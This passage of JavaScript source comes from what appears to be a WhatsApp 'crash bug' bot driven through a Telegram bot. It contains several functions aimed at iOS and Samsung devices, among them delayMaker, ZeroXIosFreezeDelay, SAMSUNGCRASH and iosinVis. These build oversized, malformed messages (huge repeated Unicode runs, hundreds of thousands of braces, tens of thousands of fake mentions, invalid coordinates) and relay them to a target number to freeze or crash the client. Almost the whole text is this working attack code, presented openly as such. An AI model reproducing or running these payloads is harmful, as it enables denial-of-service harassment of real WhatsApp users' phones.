deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "〽️⭑̤⟅̊༑ ▾ 𝐒𝐔𝐏𝐄𝐑 ⿻ 𝐑𝐀𝐉𝐀 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
]
}
}
}
}
};

await shadow.relayMessage(target, messagePayload, { participant: { jid: target } });
await shadow.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await shadow.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function delayMaker(target, mention = false, delayMs = 400) {
  for (const targett of target) {
    const generateMessage = {
     viewOnceMessage: {
       message: {
         imageMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m232/AQMP8t4-5ZHQ2nk8fAsUgGYB9q-UTgb-mAIQWjNHknLZCQpzrkkuCXh-3tbqjIl8B2XweM63Sh5uoFv-pouKkoGw4z-MWgpHSsTAnUuTw?ccb=9-4&oh=01_Q5Aa1gF2bGk5pbx0dyuS7FH7gF7yv65XoTi_DZMzLNSMRZdPtA&oe=684B6ED1&_nc_sid=e6ed6c&mms3=true",
         mimetype: "image/jpeg",
         caption: "love killing the ram" + "\u200b".repeat(11111),
         fileSha256: "1VqMUklyU+UL/CyOtNmda9uTCYoE/jTW/YStC44ge28=",
         fileLength: { low: 629145600, high: 0, unsigned: true },
         height: 2810,
         width: 6213,
         mediaKey: "3fpHZJT66ITBU7AwbBT3c9x8wwwdvJVtAGYu3DSfE7s=",
         fileEncSha256: "WRkVr7oxZzAZ24sMLYfc/WzxOC8Y9Kjc8nJLWi3Dk1s=",
         directPath: "/o1/v/t62.7118-24/f2/m232/AQMOP8t-5ZHQ2nk8fAsUgGYB9q-UTgb-mAIQWjNHknLZCQpzrkkuCXh-3tbqjIl8B2XweM63Sh5uoFv-pouKkoGw4z-MWgpHSsTAnUuTw?ccb=9-4&oh=01_Q5Aa1gF2bGk5pbx0dyuS7FH7gF7yv65XoTi_DZMzLNSMRZdPtA&oe=684B6ED1&_nc_sid=e6ed6c",
         mediaKeyTimestamp: "1743225419",
         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2MBERISGBUYLxoaL2NCOEJjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY//AABEIACIAIAMBEQACEQEDEQH/xAGiAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgsQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+gEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoLEQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2gAMAwEAAhEDEQA/AOEt4HnfauB2yxwB+PQVMpKKJlKxrXlkkcTRwRMI9nmE+WC6sFGQT1xk4J4G4NxxiueFTmev9f1+VtTJTu9SzbWUF1YIRbL5hiJKgENK4DHgnJI4XITH3u2MVnKcoT30v9y0/wCDv2IcnGVr6f1/WpjajYvZXUsZXKI+0MG3AdcDOBzwfToa6qVRVIpm8J8yub2lqlrpKymPfEwyWliLxNk4ORg8hhg8rwqnB6Vx1ffqW/J2f6dNtH123MJ+9OwaQbTU7u5e/kSK2tgAkTSYGCcZLZz2UfkOgAoxDqUopU1q+tgq80EuXdk2tRWeleXdadMgfzPKeESFskcnvkEcfQ4IwcVGGnUq3jUXncik5z0kU7u7e9hCSOv2YviWQrypfJ7YzjbngAEryD1O8Kag21v/AJf156GkY8ruZ0SDYN0xzhQDuyig5Y/Tnt9e9bN9l/mW3Y07G7NiYpLxoEjR/JAeMmVcMGPboCQeeeDjBrnqwU7qKffy2t+X/BM5R5tEP1S+adZZLSS1by05LI29gyqrbcj6DJ+bg844qaVPla5k9f0u1t/w3zFCNn71yO10yL7JJJdMoZcr80hTaThclSv8LEZ549CCM3OrLmSj/XX8Vtp/wG5u9kZul6gIWWGXaEJ2+Yw3bFOe3oCc4GM8g5zWtalzK6/r+vw3RrUhfVGvfWlvcqzHjAdUz8hIUMcng9Nn3cfxLyBhV56dSUXb+tbf57+T06vGMmmVtNWFJrcsFQvkB2lXC4I5xkFcDPXk9sHBGtZy5Xb+v8/6uVNuzItV1VjG9ogYEHBYqqMOoOQo67SF9MA8ZPBRope9/wAH8/v9eo6dPW/9f11MSus6DVsZpYtLmljldJRNGgdWIIXa3GfTgcewrmnFSqKLWln+hhNJzsxv3dLuJF4dZYwGHUAh88/hTf8AEiuln+gfbSMyug3P/9k=",
         contextInfo: {
           mentionedJid: Array.from({ length: 38110 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
           isSampled: true,
           participant: target,
           remoteJid: "status@broadcast",
           forwardingScore: 9741,
           isForwarded: true
           }
         }
       }
     }
   };
 
   const msg = generateWAMessageFromContent(target, generateMessage, {});
        
   await shadow.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
       statusJidList: [target],
         additionalNodes: [
               {
               tag: "meta",
               attrs: {},
               content: [
               {
               tag: "mentioned_users",
               attrs: {},
               content: [
               {
                tag: "to",
                attrs: { jid: target },
                content: undefined
                }
              ]
            }
          ]
        }
      ]
   });
if (mention) {
     await shadow.relayMessage(
       target,
            {
            statusMentionMessage: {
            message: {
            protocolMessage: {
            key: msg.key,
            type: 25
            }
          }
        }
      },
        {
          additionalNodes: [
          {
          tag: "meta",
          attrs: { is_status_mention: "I'll call you" },
          content: undefined
               }
             ]
           }
         );
       }
     await new Promise(res => setTimeout(res, delayMs));
   }
 }

async function RyuichiBrutalDelay(target, mention) {
  const RyuIsWin = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭄".repeat(1000) + "ꦾ".repeat(1000) + "\u0003".repeat(1000),
    rows: [
      {
        title: `${r + 1}`,
        id: `${r + 1}`
      }
    ]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: RyuIsWin,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const Ryuichi = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, Ryuichi, {});

  await shadow.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await shadow.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "Oblivion NEW DELAY HARD",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function ZeroXIosFreezeDelay(target, mention = true, kingbadboi = true) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    const XsexCrash = JSON.stringify({
        status: true,
        criador: "Oblivion is king",
        resultado: { type: "md", ws: { _eventsCount: 800000, mobile: true } }
    });

    const quotedMsg = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "ABCDEF123456"
        },
        message: {
            conversation: "Quoted crash message"
        },
        messageTimestamp: Math.floor(Date.now() / 1000)
    };

    const embeddedMusic1 = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "ᏰᏗᏰᏋ" + "ោ៝".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const embeddedMusic2 = {
        musicContentMediaId: "kontol",
        songId: "peler",
        author: "ᏰᏗᏰᏋ",
        title: "Soy el destructor del sistema WhatsApp.",
        artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
    };

    const messages = [
        {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/19167818_1100319248790517_8356004008454746382_n.enc",
                    mimetype: "video/mp4",
                    fileSha256: "l1hrH5Ol/Ko470AI8H1zlEuHxfnBbozFRZ7E80tD2L8=",
                    fileLength: "27879524",
                    seconds: 70,
                    mediaKey: "2AcdMRLVnTLIIRZFArddskCLl3duuisx2YTHYvMoQPI=",
                    caption: "ᏰᏗᏰᏋ" + stanza,
                    height: 1280,
                    width: 720,
                    fileEncSha256: "GHX2S/UWYN5R44Tfrwg2Jc+cUSIyyhkqmNUjUwAlnSU=",
                    directPath: "/v/t62.7161-24/19167818_1100319248790517_8356004008454746382_n.enc",
                    mediaKeyTimestamp: "1746354010",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: mentionedList,
                        quotedMessage: quotedMsg.message,
                        stanzaId: quotedMsg.key.id,
                        participant: quotedMsg.key.remoteJid
                    },
                    annotations: [{ embeddedContent: { embeddedMusic: embeddedMusic1 }, embeddedAction: true }]
                }
            }
        },
        {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",

mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                    mimetype: "image/webp",
                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false,
                    contextInfo: {
                        mentionedJid: mentionedList,
                        quotedMessage: quotedMsg.message,
                        stanzaId: quotedMsg.key.id,
                        participant: quotedMsg.key.remoteJid
                    }
                }
            }
        },
        {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "ᏰᏗᏰᏋ",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: mentionedList,
                        quotedMessage: quotedMsg.message,
                        stanzaId: quotedMsg.key.id,
                        participant: quotedMsg.key.remoteJid
                    },
                    annotations: [{ embeddedContent: { embeddedMusic: embeddedMusic2 }, embeddedAction: true }]
                }
            }
        }
    ];

    for (const msg of messages) {
        const generated = generateWAMessageFromContent(target, {
            viewOnceMessage: msg
        }, {});
        await shadow.relayMessage("status@broadcast", generated.message, {
            messageId: generated.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });

        if ((mention && msg === messages[0]) || (kingbadboi && msg === messages[2])) {
            await shadow.relayMessage(target, {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: generated.key,
                            type: 25
                        }
                    }
                }
            }, {
                additionalNodes: [{
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }]
            });
        }
    }
}

// ================= SAMSUNG ============== //
      async function SAMSUNGCRASH(target) {
shadow.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
    header: {
        hasMediaAttachment: false,
        title: "ꦾ".repeat(60000),
    },
    body: {
        text: ""
    },
    nativeFlowMessage: {
        messageParamsJson: "{".repeat(50000),
    }
}
}
}
},{})

shadow.relayMessage(target, {
viewOnceMessage: {
message: {
buttonsMessage: {
    text: "ꦾ".repeat(60000),
    contentText: "null",
    buttons: [
    {
        buttonId: "{".repeat(10000),
        buttonText: {
          displayText: "\u0000".repeat(9999)
        },
        type: "NATIVE_FLOW",
        nativeFlowInfo: {
            name: "cta_url",
            paramsJson: "{".repeat(50000),
        },
    }
    ],
    headerType: "TEXT"
}
}}
},{})
}

        async function chatSamsung(target) {
rih.relayMessage(target, {
"viewOnceMessage": {
"message": {
"interactiveMessage": {
    "header": {
        "hasMediaAttachment": false,
        "title": "Oblivion",
    },
    "body": {
        "text": ""
    },
    "nativeFlowMessage": {
        "messageParamsJson": `:`.repeat(5000),
    }
}
}
}
},{})
}
async function invisSamsung(target) {
shadow.relayMessage(target, {
viewOnceMessage: {
message: {
"buttonsMessage": {
    "text": "hi",
    "contentText": "null",
    "buttons": [
    {
        "buttonId": "8178018",
        "buttonText": {
          "displayText": "Oblivion"
        },
        "type": "NATIVE_FLOW",
        "nativeFlowInfo": {
            "name": "cta_url",
            "paramsJson": `{`.repeat(5000),
        },
    }
    ],
    "headerType": "TEXT"
}
}}
},{})
}

// =============== IOS ============ //
async function iosinVis(shadow, target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "ᴏʙʟɪᴠɪᴏɴ" + "𑆿".repeat(15000),
         address: "ᴏʙʟɪᴠɪᴏɴ" + "𑆿".repeat(5000),
         url: `https://api-ᴏʙʟɪᴠɪᴏɴ.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "ᴏʙʟɪᴠɪᴏɴ",
            matchedText: "ᴏʙʟɪᴠɪᴏɴ",
            description: "ᴏʙʟɪᴠɪᴏɴ".repeat(15000),
            title: "ᴏʙʟɪᴠɪᴏɴ" + "Crash".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await shadow.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await shadow.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
} 


 async function ForceInvisibleCoreNew(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Oblivion",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "Shadow",
                address: "\u200D",
              },
            },
            body: {
              text: "Shadow",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(200000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await shadow.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}


(async () => {
    console.clear();
    console.log("🚀 Starting a WhatsApp session...");
    startSesi();

    console.log("Success connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.blue(`\n
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣷⣮⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣻⣿⣿⣿⣿⣿⠂⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⢸⣧⠁⠀⠀⠀
⠀⡀⠀⠀⠀⠀⢸⣿⣿⣿⣸⣿⣷⣄⠀⠀
⠀⠈⠫⠂⠀⠀⠊⣿⢿⣿⡏⣿⠿⠟⠀⠀
⠀⠀⠀⠀⠱⡀⠈⠁⠀⢝⢷⡸⡇⠀⠀⠀
⠀⠀⠀⠀⢀⠇⠀⠀⢀⣾⣦⢳⡀⠀⠀⠀
